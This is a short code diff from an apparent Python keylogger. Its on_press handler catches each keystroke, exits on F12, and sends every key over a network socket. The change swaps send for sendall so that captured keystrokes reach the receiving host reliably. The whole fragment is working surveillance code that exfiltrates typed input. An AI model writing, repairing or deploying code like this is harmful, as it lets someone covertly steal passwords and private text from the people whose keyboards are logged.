@@ -19,7 +19,7 @@ def on_press(key):
         key = key.replace("'", "")
         if key == "Key.f12":
             raise SystemExit(0)
-        clientSocket.send(key.encode('utf-8'))
+        clientSocket.sendall(key.encode('utf-8'))
     except Exception as e:
         print("Error: " + str(e))
 
